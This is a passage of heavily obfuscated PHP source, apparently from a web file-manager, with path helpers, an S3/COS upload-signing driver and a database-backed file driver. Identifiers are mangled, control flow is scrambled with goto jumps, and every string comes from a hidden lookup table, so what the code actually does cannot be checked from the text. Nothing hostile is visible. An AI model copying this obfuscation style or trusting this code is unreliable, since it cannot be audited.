$C¥˜¦øçÇ†[1183]) === 0) { return !0; } return !1; goto dÑï´´å”; A“•µ‰‡õ—: $C¥˜¦øçÇ† =& $_SERVER[œÕÊİğö]; if (substr($D¡ Æß‘ß, 0, 1) != $C¥˜¦øçÇ†[1179]) { return !0; } if (strpos($D¡ Æß‘ß, $C¥˜¦øçÇ†[412]) === 0) { return !0; } goto DÀÅó³¾; dÑï´´å”: } public static function clear($cî ˜¼áô¤) { goto c½Ó®¨Ñ¦±; c×Ô”´™‡ : return $cî ˜¼áô¤; goto F¦Ç„¯À•; F“œâµÄÊ•: $cî ˜¼áô¤ = preg_replace($B¸­ÀÜíñ[1186], $B¸­ÀÜíñ[8], $cî ˜¼áô¤); if ($cî ˜¼áô¤ == $B¸­ÀÜíñ[8]) { return $B¸­ÀÜíñ[8]; } $cî ˜¼áô¤ = rtrim($cî ˜¼áô¤, $B¸­ÀÜíñ[8]); goto c×Ô”´™‡ ; Bª‚Òâ¢ç¥: $fƒÏÌƒ ƒá = $B¸­ÀÜíñ[1184]; if (substr($cî ˜¼áô¤, 0, 3) == $B¸­ÀÜíñ[1185]) { $cî ˜¼áô¤ = substr($cî ˜¼áô¤, 3); } while (strstr($cî ˜¼áô¤, $fƒÏÌƒ ƒá)) { $cî ˜¼áô¤ = str_replace($fƒÏÌƒ ƒá, $B¸­ÀÜíñ[8], $cî ˜¼áô¤); } goto F“œâµÄÊ•; c½Ó®¨Ñ¦±: $B¸­ÀÜíñ =& $_SERVER[œÕÊİğö]; $cî ˜¼áô¤ = str_replace(array($B¸­ÀÜíñ[1060], $B¸­ÀÜíñ[15]), $B¸­ÀÜíñ[60], $cî ˜¼áô¤); $cî ˜¼áô¤ = str_replace($B¸­ÀÜíñ[107], $B¸­ÀÜíñ[8], $cî ˜¼áô¤); goto Bª‚Òâ¢ç¥; F¦Ç„¯À•: } public static function sourceID($DŒ¯Ó™ÄÑ) { $A¶–¢‘Â¥ =& $_SERVER[œÕÊİğö]; $DÙï—¼Ú¢ = self::parse($DŒ¯Ó™ÄÑ); if ($DÙï—¼Ú¢[$A¶–¢‘Â¥[39]] !== self::KOD_SOURCE) { show_json(LNG($A¶–¢‘Â¥[1187]), !1); } return $DÙï—¼Ú¢[$A¶–¢‘Â¥[404]]; } public static function make($B²«‹åÃ°) { if (!$B²«‹åÃ°) { return !1; } return self::makePath(self::KOD_SOURCE, intval($B²«‹åÃ°)); } public static function makeShare($cÜ‹¨áàŞö, $A¢¤‘À„ë) { return self::makePath(self::KOD_SHARE_ITEM, $cÜ‹¨áàŞö, $A¢¤‘À„ë); } public static function makeFileTypePath($fõ³¶Üø¤ô) { return self::makePath(self::KOD_USER_FILE_TYPE, $fõ³¶Üø¤ô); } public static function makeFileTagPath($BñÎîªß Á) { return self::makePath(self::KOD_USER_FILE_TAG, $BñÎîªß Á); } public static function makePath($Fİ³µ…”¤¸, $bêÔ¯òí‡” = '', $a÷ö†õ•…ì = '') { $CÎ—Ÿë¶Ë =& $_SERVER[œÕÊİğö]; $d¿ÙªŞ±Ñ = substr($Fİ³µ…”¤¸, 1, -1); $dÀîºî°Œå = $CÎ—Ÿë¶Ë[1188] . $d¿ÙªŞ±Ñ . $CÎ—Ÿë¶Ë[1189] . $bêÔ¯òí‡” . $CÎ—Ÿë¶Ë[1190]; $dÀîºî°Œå = $a÷ö†õ•…ì ? $dÀîºî°Œå . $a÷ö†õ•…ì . $CÎ—Ÿë¶Ë[8] : $dÀîºî°Œå; return $dÀîºî°Œå; } public static function hashPath($b±ÑĞ¼Ú‹, $bÜ¤ô¸¿áô = true) { goto eÍŒˆã•¤“; cáÄ°•‡Ô…: return $a½•”ßØ¯ï; goto A§åŠåÁ‚Ü; eÍŒˆã•¤“: $dæÈÍËª¨ =& $_SERVER[œÕÊİğö]; $CÀ¯¡Ù¼¼ = is_array($b±ÑĞ¼Ú‹) ? $b±ÑĞ¼Ú‹ : IO::info($b±ÑĞ¼Ú‹); $a½•”ßØ¯ï = _get($CÀ¯¡Ù¼¼, $dæÈÍËª¨[1191], $dæÈÍËª¨[43]); goto c–Æ¸Öå†; c–Æ¸Öå†: if (!$a½•”ßØ¯ï && isset($CÀ¯¡Ù¼¼[$dæÈÍËª¨[406]])) { $CÀ¯¡Ù¼¼ = IO::info(KodIO::make($CÀ¯¡Ù¼¼[$dæÈÍËª¨[406]])); $a½•”ßØ¯ï = _get($CÀ¯¡Ù¼¼, $dæÈÍËª¨[1191], $dæÈÍËª¨[43]); } if (!$a½•”ßØ¯ï && $bÜ¤ô¸¿áô) { $EÅÃ  §­¦ = KodIO::parse($CÀ¯¡Ù¼¼[$dæÈÍËª¨[86]]); if (!$EÅÃ  §­¦[$dæÈÍËª¨[39]]) { $a½•”ßØ¯ï = IO::hashSimple($CÀ¯¡Ù¼¼[$dæÈÍËª¨[86]]); } } if (!$a½•”ßØ¯ï) { $a½•”ßØ¯ï = md5($CÀ¯¡Ù¼¼[$dæÈÍËª¨[86]] . $CÀ¯¡Ù¼¼[$dæÈÍËª¨[88]] . $CÀ¯¡Ù¼¼[$dæÈÍËª¨[94]]); } goto cáÄ°•‡Ô…; A§åŠåÁ‚Ü: } public static function initSystemPath() { goto fÏĞŸ¨¶ÌÆ; BîË¦È«Å³: define($CƒÌÚÆÒö[1194], self::systemPath($CƒÌÚÆÒö[1195])); define($CƒÌÚÆÒö[1196], self::systemPath($CƒÌÚÆÒö[1197])); define($CƒÌÚÆÒö[1198], self::systemPath($CƒÌÚÆÒö[1199])); goto A—¥ÌÙ”ã™; A—¥ÌÙ”ã™: IOHistory::bindEvent(); goto cñÏª’¶Î; fÏĞŸ¨¶ÌÆ: $CƒÌÚÆÒö =& $_SERVER[œÕÊİğö]; if (defined($CƒÌÚÆÒö[1192])) { return; } define($CƒÌÚÆÒö[1192], self::systemPath($CƒÌÚÆÒö[1193])); goto BîË¦È«Å³; cñÏª’¶Î: } public static function systemPath($F¹•ªÁ‚ ˆ) { goto fÙŒŞ½ğ¹; B¶«†ß¬ò: if ($BØõåù°ø¥) { return $BØõåù°ø¥; } if ($F¹•ªÁ‚ ˆ == $eÃöÌß–¤Õ[1193]) { $BØõåù°ø¥ = self::make(Model($eÃöÌß–¤Õ[822])->systemRootPathAdd($eÃöÌß–¤Õ[540])); } else { $BØõåù°ø¥ = self::systemPath($eÃöÌß–¤Õ[1193]); $EøğİÇù¢¼ = self::sourceID($BØõåù°ø¥); $BØõåù°ø¥ = self::make(Model($eÃöÌß–¤Õ[822])->mkdir($EøğİÇù¢¼, $F¹•ªÁ‚ ˆ)); } Model($eÃöÌß–¤Õ[760])->set($AèäÈ§¯ó¶, $BØõåù°ø¥); goto D„‚Ôê‚Ú; D„‚Ôê‚Ú: return $BØõåù°ø¥; goto F¯£•ô¯å»; fÙŒŞ½ğ¹: $eÃöÌß–¤Õ =& $_SERVER[œÕÊİğö]; $AèäÈ§¯ó¶ = $eÃöÌß–¤Õ[1200] . ucfirst($F¹•ªÁ‚ ˆ); $BØõåù°ø¥ = Model($eÃöÌß–¤Õ[760])->get($AèäÈ§¯ó¶); goto B¶«†ß¬ò; F¯£•ô¯å»: } public static function systemFolder($C¯øÆ£âœ½) { $a‰Úøõ¼Ï“ = IO_PATH_SYSTEM_SOURCE . $C¯øÆ£âœ½; $F˜¬ÎÆê = Cache::get($a‰Úøõ¼Ï“); if (!$F˜¬ÎÆê) { $AÃË¦ä¦Â = IO::infoFull($a‰Úøõ¼Ï“); if (!$AÃË¦ä¦Â) { $F˜¬ÎÆê = IO::mkdir($a‰Úøõ¼Ï“, REPEAT_SKIP); } else { $F˜¬ÎÆê = $AÃË¦ä¦Â[$_SERVER[œÕÊİğö][86]]; } Cache::set($a‰Úøõ¼Ï“, $F˜¬ÎÆê, 3600 * 10); } return $F˜¬ÎÆê; } public static function defaultDriver() { return Model($_SERVER[œÕÊİğö][757])->defaultDriver(); } public static function defaultIO() { $DñíÎâ‹´· =& $_SERVER[œÕÊİğö]; $E’´ÌëóÁ = self::defaultDriver(); return $DñíÎâ‹´·[1201] . $E’´ÌëóÁ[$DñíÎâ‹´·[404]] . $DñíÎâ‹´·[1190]; } public static function defaultDriverInit() { static $dÕš¨‡Ô©” = false; if ($dÕš¨‡Ô©”) { return $dÕš¨‡Ô©”; } $dÕš¨‡Ô©” = IO::init(self::defaultIO()); return $dÕš¨‡Ô©”; } public static function fileTypeList() { $Dã÷¦ ÎÕ‡ =& $_SERVER[œÕÊİğö]; $B¦Ş¬Öñ = $GLOBALS[$Dã÷¦ ÎÕ‡[6]][$Dã÷¦ ÎÕ‡[1202]]; foreach ($B¦Ş¬Öñ as $bœœŒµ  => $fÚ‹Ã¼Ä¢Ÿ) { $F±Şˆ“ÆÆÆ = $Dã÷¦ ÎÕ‡[1203] . $bœœŒµ ; $a‚ÌìâÇŒä = LNG($F±Şˆ“ÆÆÆ); if ($F±Şˆ“ÆÆÆ != $a‚ÌìâÇŒä) { $B¦Ş¬Öñ[$bœœŒµ ][$Dã÷¦ ÎÕ‡[38]] = $a‚ÌìâÇŒä; } } return $B¦Ş¬Öñ; } public static function transferType($D¥ŒÁÇ±îÔ, $FÌÃ¹ØÆç”) { goto aË¾å§ïÀª; aË¾å§ïÀª: $a¹£‡‹­›± =& $_SERVER[œÕÊİğö]; $E™‰çÉ­¦‘ = self::driverType($D¥ŒÁÇ±îÔ); $FìÔçŠ—Áì = self::driverType($FÌÃ¹ØÆç”); goto eõãäÀ‡ä‘; eõãäÀ‡ä‘: if ($E™‰çÉ­¦‘[$a¹£‡‹­›±[39]] == $FìÔçŠ—Áì[$a¹£‡‹­›±[39]] && $E™‰çÉ­¦‘[$a¹£‡‹­›±[1204]] == $FìÔçŠ—Áì[$a¹£‡‹­›±[1204]]) { return $a¹£‡‹­›±[1205]; } if ($E™‰çÉ­¦‘[$a¹£‡‹­›±[39]] == $a¹£‡‹­›±[855] && $FìÔçŠ—Áì[$a¹£‡‹­›±[39]] == $a¹£‡‹­›±[116]) { return $a¹£‡‹­›±[1116]; } if ($E™‰çÉ­¦‘[$a¹£‡‹­›±[39]] == $a¹£‡‹­›±[116] && $FìÔçŠ—Áì[$a¹£‡‹­›±[39]] == $a¹£‡‹­›±[855]) { return $a¹£‡‹­›±[117]; } goto BºÛ“™í»; BºÛ“™í»: return $a¹£‡‹­›±[1206]; goto Eä¿ó°ÙÖå; Eä¿ó°ÙÖå: } public static function driverType($b…Š—‹Ù¶“) { goto d¬‡µÎßÌÖ; Aä·Ö·ªä‚: return array($a¾À¥ÔÚˆ”[39] => $a¾À¥ÔÚˆ”[855], $a¾À¥ÔÚˆ”[1204] => $b…Š—‹Ù¶“->pathDriver, $a¾À¥ÔÚˆ”[86] => $EËÚªìŠŒó); goto B©¦‡“›–; d¬‡µÎßÌÖ: $a¾À¥ÔÚˆ” =& $_SERVER[œÕÊİğö]; $EËÚªìŠŒó = $b…Š—‹Ù¶“->path; $fâƒÂÇÖáÂ = str_replace($a¾À¥ÔÚˆ”[1207], $a¾À¥ÔÚˆ”[43], strtolower($b…Š—‹Ù¶“->getType())); goto E’…ÕêÍ¡¢; E’…ÕêÍ¡¢: if ($fâƒÂÇÖáÂ == $a¾À¥ÔÚˆ”[748] || $fâƒÂÇÖáÂ == $a¾À¥ÔÚˆ”[1208] || $fâƒÂÇÖáÂ == $a¾À¥ÔÚˆ”[1209]) { $b…Š—‹Ù¶“ = self::defaultDriverInit(); } else { if ($fâƒÂÇÖáÂ == $a¾À¥ÔÚˆ”[1123] || $fâƒÂÇÖáÂ == $a¾À¥ÔÚˆ”[1210]) { $b…Š—‹Ù¶“ = IO::init($b…Š—‹Ù¶“->pathParse[$a¾À¥ÔÚˆ”[1070]]); } } $fâƒÂÇÖáÂ = str_replace($a¾À¥ÔÚˆ”[1207], $a¾À¥ÔÚˆ”[43], strtolower($b…Š—‹Ù¶“->getType())); if ($fâƒÂÇÖáÂ == $a¾À¥ÔÚˆ”[116]) { return array($a¾À¥ÔÚˆ”[39] => $a¾À¥ÔÚˆ”[116], $a¾À¥ÔÚˆ”[1204] => $a¾À¥ÔÚˆ”[43], $a¾À¥ÔÚˆ”[86] => $EËÚªìŠŒó); } goto Aä·Ö·ªä‚; B©¦‡“›–: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($Cæˆ¡õßËÙ) { parent::__construct($Cæˆ¡õßËÙ); $this->signatureVersion($_SERVER[œÕÊİğö][222]); } public function uploadFormData($fÜ”á‘ÔÙ„, $f·Ø£åĞœÛ = 3600) { goto C¹¶À†Ì›; FíãÌùç÷æ: $fœÜ°òÒùÂ = sha1($F©ĞïŞœÔ¾); $cùçíÀÔá² = hash_hmac($DÕ¼ÉÍá†[239], $fœÜ°òÒùÂ, $DÆ²‡ÕÉĞ); $c¶“¢™òã© = array($DÕ¼ÉÍá†[1215] => $CÒì÷¹Ñ™, $DÕ¼ÉÍá†[1219] => $Bˆ‚ÖğÌ, $DÕ¼ÉÍá†[1223] => base64_encode($F©ĞïŞœÔ¾), $DÕ¼ÉÍá†[1220] => $BÎÏŸã˜¿, $DÕ¼ÉÍá†[1221] => $this->accessKey, $DÕ¼ÉÍá†[1224] => $cÅèÇ„ãŸê, $DÕ¼ÉÍá†[1225] => $cùçíÀÔá², $DÕ¼ÉÍá†[185] => $this->getHost()); goto bå®ÒÉŞâ¿; FêÀå¦¤¬: $F©ĞïŞœÔ¾ = array($DÕ¼ÉÍá†[1213] => $cÁÅ´°Ïñ, $DÕ¼ÉÍá†[1214] => array(array($DÕ¼ÉÍá†[1215] => $CÒì÷¹Ñ™), array($DÕ¼ÉÍá†[1216] => $this->bucket), array($DÕ¼ÉÍá†[1217], $DÕ¼ÉÍá†[1218], $DÕ¼ÉÍá†[43]), array($DÕ¼ÉÍá†[1219] => $Bˆ‚ÖğÌ), array($DÕ¼ÉÍá†[1220] => $BÎÏŸã˜¿), array($DÕ¼ÉÍá†[1221] => $this->accessKey), array($DÕ¼ÉÍá†[1222] => $cÅèÇ„ãŸê))); $F©ĞïŞœÔ¾ = json_encode($F©ĞïŞœÔ¾); $DÆ²‡ÕÉĞ = hash_hmac($DÕ¼ÉÍá†[239], $cÅèÇ„ãŸê, $this->secret); goto FíãÌùç÷æ; C¹¶À†Ì›: $DÕ¼ÉÍá† =& $_SERVER[œÕÊİğö]; $CÒì÷¹Ñ™ = $DÕ¼ÉÍá†[202]; $BÎÏŸã˜¿ = $DÕ¼ÉÍá†[239]; goto Eƒß¼Ó—«ì; bå®ÒÉŞâ¿: return $c¶“¢™òã©; goto fºğØÛ µÅ; Eƒß¼Ó—«ì: $Bˆ‚ÖğÌ = $DÕ¼ÉÍá†[1211]; $cÁÅ´°Ïñ = gmdate($DÕ¼ÉÍá†[1212], time() + $f·Ø£åĞœÛ); $cÅèÇ„ãŸê = (string) time() . $DÕ¼ÉÍá†[78] . (string) (time() + $f·Ø£åĞœÛ); goto FêÀå¦¤¬; fºğØÛ µÅ: } public function fileOutLink($BÁŸ´¹ƒ²ö) { $fæ£¢èÖ®… =& $_SERVER[œÕÊİğö]; if (substr($BÁŸ´¹ƒ²ö, 0, 7) == $fæ£¢èÖ®…[1226]) { $BÁŸ´¹ƒ²ö = $fæ£¢èÖ®…[1227] . substr($BÁŸ´¹ƒ²ö, 7); } header($fæ£¢èÖ®…[169] . $BÁŸ´¹ƒ²ö); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($AòÆ‰¯ËŸî) { $this->pathParse = $AòÆ‰¯ËŸî; $this->model = Model($_SERVER[œÕÊİğö][1228]); } public function getPath($F·ìÀ”÷áÃ) { return trim($F·ìÀ”÷áÃ, $_SERVER[œÕÊİğö][8]); } public function pathFather($bÔìÜ‚ƒ) { $f‰»”³© = $this->parse($bÔìÜ‚ƒ); $f‰»”³© = $this->infoSimple($bÔìÜ‚ƒ); return $f‰»”³© ? $f‰»”³©[$_SERVER[œÕÊİğö][501]] : !1; } public function pathThis($DÑÉ°¤ªŠ) { $CŸ…Áç™­ = $this->infoSimple($DÑÉ°¤ªŠ); return $CŸ…Áç™­ ? $CŸ…Áç™­[$_SERVER[œÕÊİğö][38]] : !1; } public function getPathOuter($cÃ†íâĞÏØ) { if (!$cÃ†íâĞÏØ) { return $cÃ†íâĞÏØ; } $dÈêò ñÆ = $this->parse($cÃ†íâĞÏØ); return KodIO::make($dÈêò ñÆ[$_SERVER[œÕÊİğö][404]]); } public function copyFolderFromIO($DÃêğĞÀ‰², $C÷ƒ˜Ï¢¶‚, $E³®¾è–Ò, $E¶®±„° ¯, $BÛ†ÆÒ×‰ ) { $Bõ†å»‡‹ = $this->model->copyFolderFromIO($DÃêğĞÀ‰², $C÷ƒ˜Ï¢¶‚, $E³®¾è–Ò, $E¶®±„° ¯, $BÛ†ÆÒ×‰ ); return KodIO::make($Bõ†å»‡‹); } public function isParentOf($d–•±ÖÀ¾, $BŒÍ¡Şä) { return $this->model->isParentOf($d–•±ÖÀ¾, $BŒÍ¡Şä); } public function mkfile($fÕíĞÓïœÚ, $bØ„–Ã§âÂ = '', $d¯Í¦†ÄŒ‡ = REPEAT_RENAME) { $dÙ ñÎÎ×› =& $_SERVER[œÕÊİğö]; $E¢¹»±·“ = $this->parse($fÕíĞÓïœÚ); $fÕíĞÓïœÚ = $E¢¹»±·“[$dÙ ñÎÎ×›[404]]; for ($bÔ”º·â‹À = 0; $bÔ”º·â‹À < count($E¢¹»±·“[$dÙ ñÎÎ×›[1229]]); $bÔ”º·â‹À++) { $EŞŒÍÛ‹İë = $E¢¹»±·“[$dÙ ñÎÎ×›[1229]][$bÔ”º·â‹À]; if ($bÔ”º·â‹À == count($E¢¹»±·“[$dÙ ñÎÎ×›[1229]]) - 1) { $fÕíĞÓïœÚ = $this->model->mkfile($fÕíĞÓïœÚ, $EŞŒÍÛ‹İë, $bØ„–Ã§âÂ, $d¯Í¦†ÄŒ‡); break; } $fÕíĞÓïœÚ = $this->model->mkdir($fÕíĞÓïœÚ, $EŞŒÍÛ‹İë, REPEAT_SKIP); } return $this->getPathOuter($fÕíĞÓïœÚ); } public function mkdir($bÑØ¶­œ†É, $c‡ëôˆéõ = REPEAT_SKIP) { $dË›¡àµÄÎ =& $_SERVER[œÕÊİğö]; $CÊ‡âİİÑ = $this->parse($bÑØ¶­œ†É); $bÑØ¶­œ†É = $CÊ‡âİİÑ[$dË›¡àµÄÎ[404]]; for ($Céö‰…ëğ¤ = 0; $Céö‰…ëğ¤ < count($CÊ‡âİİÑ[$dË›¡àµÄÎ[1229]]); $Céö‰…ëğ¤++) { $dÅíïå„êª = $CÊ‡âİİÑ[$dË›¡àµÄÎ[1229]][$Céö‰…ëğ¤]; $bÑØ¶­œ†É = $this->model->mkdir($bÑØ¶­œ†É, $dÅíïå„êª, $c‡ëôˆéõ); } return $this->getPathOuter($bÑØ¶­œ†É); } public function copyFile($aÉ¡ˆ»ˆ„Â, $b«Í´Ù¡ä„, $båÔˆ†¼ã´ = REPEAT_REPLACE) { $C‰ÓÛ¡Õ²‘ =& $_SERVER[œÕÊİğö]; $f˜áŒ˜“Á´ = $this->parse($b«Í´Ù¡ä„); $FöËÎÙ¬Ÿ¥ = $this->model->copy($aÉ¡ˆ»ˆ„Â, $f˜áŒ˜“Á´[$C‰ÓÛ¡Õ²‘[404]], $båÔˆ†¼ã´, $f˜áŒ˜“Á´[$C‰ÓÛ¡Õ²‘[86]]); return $FöËÎÙ¬Ÿ¥ ? $this->getPathOuter($FöËÎÙ¬Ÿ¥) : !1; } public function moveFile($fóÛˆ£‰®’, $AÒÑ¿â‡ÊÎ, $c‰Ó™ƒ¾ãà = REPEAT_REPLACE) { $eªÔ¬«Ôä• =& $_SERVER[œÕÊİğö]; $b é´–ó´– = $this->parse($AÒÑ¿â‡ÊÎ); $A‰ÌÔ†«Àò = $this->model->move($fóÛˆ£‰®’, $b é´–ó´–[$eªÔ¬«Ôä•[404]], $c‰Ó™ƒ¾ãà, $b é´–ó´–[$eªÔ¬«Ôä•[86]]); return $A‰ÌÔ†«Àò ? $this->getPathOuter($A‰ÌÔ†«Àò) : !1; } public function copy($AÎ¦¾­Ü„‘, $Bã½‰ŸÌ£“, $b†éñ­‰£Ã = REPEAT_REPLACE) { $A·–Ø—Ò°Ó = $this->parse($Bã½‰ŸÌ£“); $D¨§íÕ‰Èº = $this->model->copy($AÎ¦¾­Ü„‘, $A·–Ø—Ò°Ó[$_SERVER[œÕÊİğö][404]], $b†éñ­‰£Ã); return $D¨§íÕ‰Èº ? $this->getPathOuter($D¨§íÕ‰Èº) : !1; } public function moveSameAllow() { } public function move($A‘Å×àë—“, $cÙ±„Ã›‘, $CÙšŒÔ·¶ = REPEAT_REPLACE) { $dõá³ğ¹Û· = $this->parse($cÙ±„Ã›‘); $A„İÑ¨Ç” = $this->model->move($A‘Å×àë—“, $dõá³ğ¹Û·[$_SERVER[œÕÊİğö][404]], $CÙšŒÔ·¶); return $A„İÑ¨Ç” ? $this->getPathOuter($A„İÑ¨Ç”) : !1; } public function remove($CÒí¡İÍ¥å, $Fˆ‡àâÎ¬’ = true) { return $this->model->remove($CÒí¡İÍ¥å, $Fˆ‡àâÎ¬’); } public function rename($B³•…–è½Ñ, $a¢Îöï¤ä) { $AºÑÙ¬Ä† = $this->model->rename($B³•…–è½Ñ, $a¢Îöï¤ä); return $AºÑÙ¬Ä† ? $this->getPathOuter($B³•…–è½Ñ) : $AºÑÙ¬Ä†; } public function size($Eğ®è¤¦ˆï) { $d¥öò…Ò = $this->infoSimple($Eğ®è¤¦ˆï); return $d¥öò…Ò ? $d¥öò…Ò[$_SERVER[œÕÊİğö][88]] : 0; } public function infoSimple($DÛ§³¡¾£) { return $this->model->sourceInfo($DÛ§³¡¾£); } public function info($c¢íŠƒÆğÛ) { return $this->infoParse($c¢íŠƒÆğÛ); } public function infoAuth($e­’Àóˆ·¸) { return $this->infoParse($e­’Àóˆ·¸, !1, !0); } public function infoWithChildren($Eáíï‘×‹›) { return $this->infoParse($Eáíï‘×‹›, !0); } protected function infoParse($dç±•¬‘Ù, $CÃÑ•ˆˆ÷ = false, $ašĞ‹ä°ÅÕ = false) { if (!$CÃÑ•ˆˆ÷) { return $this->model->pathInfo($dç±•¬‘Ù, $ašĞ‹ä°ÅÕ); } return $this->model->pathInfoMore($dç±•¬‘Ù); } public function infoFull($C¾ÂŞ‚¿õ) { $DÆô“ªÛ¨ =& $_SERVER[œÕÊİğö]; $A—Şá®à¬ = explode($DÆô“ªÛ¨[8], $C¾ÂŞ‚¿õ); $FÊÇ”âã÷¼ = implode($DÆô“ªÛ¨[8], array_splice($A—Şá®à¬, 1)); return $this->model->pathInfoByPath($A—Şá®à¬[0], $FÊÇ”âã÷¼); } public function hashSimple($Fœ„«™¶¡Õ) { $FŸ©šÃ‘šÖ =& $_SERVER[œÕÊİğö]; $eÆŠ»ˆİ­ = $this->infoWithChildren($Fœ„«™¶¡Õ); return $eÆŠ»ˆİ­[$FŸ©šÃ‘šÖ[174]][$FŸ©šÃ‘šÖ[181]]; } public function hashMd5($bøÂˆ¼¨Û) { $fìŸÌšÎßË =& $_SERVER[œÕÊİğö]; $e¯Ä«Ì¢ó´ = $this->infoWithChildren($bøÂˆ¼¨Û); return $e¯Ä«Ì¢ó´[$fìŸÌšÎßË[174]][$fìŸÌšÎßË[180]]; } public function exist($e§ÜÎ÷ŞÒ) { $eé´¥Ò¤¾® =& $_SERVER[œÕÊİğö]; $D”¹ç¾Éê™ = $this->parse($e§ÜÎ÷ŞÒ); if (!$D”¹ç¾Éê™[$eé´¥Ò¤¾®[86]]) { return $this->isFile($e§ÜÎ÷ŞÒ) || $this->isFolder($e§ÜÎ÷ŞÒ); } $Fö²î×†‚Ï = array($eé´¥Ò¤¾®[405] => $D”¹ç¾Éê™[$eé´¥Ò¤¾®[404]], $eé´¥Ò¤¾®[38] => $D”¹ç¾Éê™[$eé´¥Ò¤¾®[86]]); $cÑåîÈ¸ = $this->model->where($Fö²î×†‚Ï)->find(); return $cÑåîÈ¸ ? !0 : !1; } public function isFile($aÍ¼çÅ¦ß) { $E¢ÃÎ‚×¡² =& $_SERVER[œÕÊİğö]; $d¢ÅÑ‰«£¦ = $this->infoSimple($aÍ¼çÅ¦ß); return $d¢ÅÑ‰«£¦ && $d¢ÅÑ‰«£¦[$E¢ÃÎ‚×¡²[414]] == $E¢ÃÎ‚×¡²[97] ? !1 : !0; } public function isFolder($FÖÏ™îœÆŞ) { $dõŞ›†èõ =& $_SERVER[œÕÊİğö]; $CÓ‚Ø›¥£Á = $this->infoSimple($FÖÏ™îœÆŞ); return $CÓ‚Ø›¥£Á && $CÓ‚Ø›¥£Á[$dõŞ›†èõ[414]] == $dõŞ›†èõ[97] ? !0 : !1; } public function listPath($E¼î¸ÄÓºµ, $D¿Òæ‘±ó† = false) { $cĞ„òÚÍİõ =& $_SERVER[œÕÊİğö]; if ($E¼î¸ÄÓºµ == $cĞ„òÚÍİõ[43]) { return !1; } $Aô´½²öİë = array($cĞ„òÚÍİõ[405] => $E¼î¸ÄÓºµ); if ($D¿Òæ‘±ó†) { return $this->model->listSource($Aô´½²öİë, -1); } return $this->model->listSource($Aô´½²öİë); } public function has($EÁÇ»³Œ£ø, $A¦Œ•è¾ùó = false, $Dîœ½‹¯Õ = null) { $e×êó‚°§ó =& $_SERVER[œÕÊİğö]; $CÃÆŞÖä¦Ò = $this->infoWithChildren($EÁÇ»³Œ£ø); if ($A¦Œ•è¾ùó) { return array($e×êó‚°§ó[214] => $CÃÆŞÖä¦Ò[$e×êó‚°§ó[214]], $e×êó‚°§ó[213] => $CÃÆŞÖä¦Ò[$e×êó‚°§ó[213]]); } return $Dîœ½‹¯Õ ? $CÃÆŞÖä¦Ò[$e×êó‚°§ó[214]] : $CÃÆŞÖä¦Ò[$e×êó‚°§ó[213]]; } public function listAll($cÚèÁ‘·å) { $Aøâ¼Ö—˜× = IO::info($this->pathParse[$_SERVER[œÕÊİğö][86]]); if (!$Aøâ¼Ö—˜×) { return array(); } return $this->model->listAll($cÚèÁ‘·å); } public function getContent($aÅ’¸¸é£‹) { return $this->model->getContent($aÅ’¸¸é£‹); } public function setContent($CÇ»—‡†„‡, $Fê¦Ÿ‚‰ï‘ = '') { return $this->model->setContent($CÇ»—‡†„‡, $Fê¦Ÿ‚‰ï‘); } public function fileSubstr($D³ã¬Òéã, $Bñ»£ˆÌ†, $e‚Îîì“Š¾) { return $this->model->fileSubstr($D³ã¬Òéã, $Bñ»£ˆÌ†, $e‚Îîì“Š¾); } public function download($bœ……è¼â, $DŠ‹ñÊ»«ç = '') { $c‰Î±æ‚ƒ = get_path_father($DŠ‹ñÊ»«ç); $aÁ‰•æİºî = get_path_this($DŠ‹ñÊ»«ç); $aÛÆƒŞ³÷‘ = $this->model->fileInfoGet($bœ……è¼â); $cÄÅŠ¶Ò = IO::copy($aÛÆƒŞ³÷‘[$_SERVER[œÕÊİğö][86]], $c‰Î±æ‚ƒ, !1, $aÁ‰•æİºî); return $cÄÅŠ¶Ò; } public function setModifyTime($BŠŒ„„œçÇ, $b®Ë£àÙøŠ = '') { $CØ†•Ÿ¸×È =& $_SERVER[œÕÊİğö]; if (!$BŠŒ„„œçÇ) { return; } $this->model->where(array($CØ†•Ÿ¸×È[421] => $BŠŒ„„œçÇ))->save(array($CØ†•Ÿ¸×È[94] => $b®Ë£àÙøŠ)); } public function upload($aâ†ªù…„¤, $aÓàçãÂñ, $Cíô¦…Å = false, $D÷„ŸÕ²§Ì = REPEAT_REPLACE) { $b•¡¥¶è²† =& $_SERVER[œÕÊİğö]; $c…ßàÇ™‘± = $this->parse($aâ†ªù…„¤); $CèÛìŒ†°§ = $this->model->addFile($c…ßàÇ™‘±[$b•¡¥¶è²†[404]], $aÓàçãÂñ, $c…ßàÇ™‘±[$b•¡¥¶è²†[86]], $Cíô¦…Å, $D÷„ŸÕ²§Ì); return $this->getPathOuter($CèÛìŒ†°§); } public function uploadFileByID($DŒèâšç°, $FŸÚä°ì, $Dˆ–Áë’ãÉ) { $a†‘³¡ò³º =& $_SERVER[œÕÊİğö]; $b‘ÕÔ¸“‚‡ = $this->parse($DŒèâšç°); $EÆÜÍ¯ñÛ = $this->model->addFileByFileID($b‘ÕÔ¸“‚‡[$a†‘³¡ò³º[404]], $FŸÚä°ì, $b‘ÕÔ¸“‚‡[$a†‘³¡ò³º[86]], $Dˆ–Áë’ãÉ); return $this->getPathOuter($EÆÜÍ¯ñÛ); } public function addFileByRemote($A›ˆ÷Óä, $f•À—Ûœ, $BÑ™º„ëÚã = array(), $D¥Ì¤´¤ƒ = '', $f¬Û—›ğ˜Š) { $e‹êÚ°œ­ =& $_SERVER[œÕÊİğö]; $ašÆâ²­±¶ = $this->parse($A›ˆ÷Óä); $D¥Ì¤´¤ƒ = empty($D¥Ì¤´¤ƒ) ? $ašÆâ²­±¶[$e‹êÚ°œ­[86]] : $D¥Ì¤´¤ƒ; $EêÄ¯¶ì‘ = $this->model->addFileByRemote($ašÆâ²­±¶[$e‹êÚ°œ­[404]], $f•À—Ûœ, $D¥Ì¤´¤ƒ, $BÑ™º„ëÚã, $f¬Û—›ğ˜Š); return $this->getPathOuter($EêÄ¯¶ì‘); } public function uploadLink($E¹•ÎÉ‡Ì, $Dë«˜·ŠÖ˜ = 0) { $eŞ¶àİ‘İ =& $_SERVER[œÕÊİğö]; $aˆ¿ˆ±ôçİ = $this->parse($E¹•ÎÉ‡Ì); $EˆóĞ¢›½³ = _get($GLOBALS[$eŞ¶àİ‘İ[7]], $eŞ¶àİ‘İ[1230]); $aã›ƒğŠÄ„ = _get($GLOBALS[$eŞ¶àİ‘İ[7]], $eŞ¶àİ‘İ[1231]); $E¹•ÎÉ‡Ì = 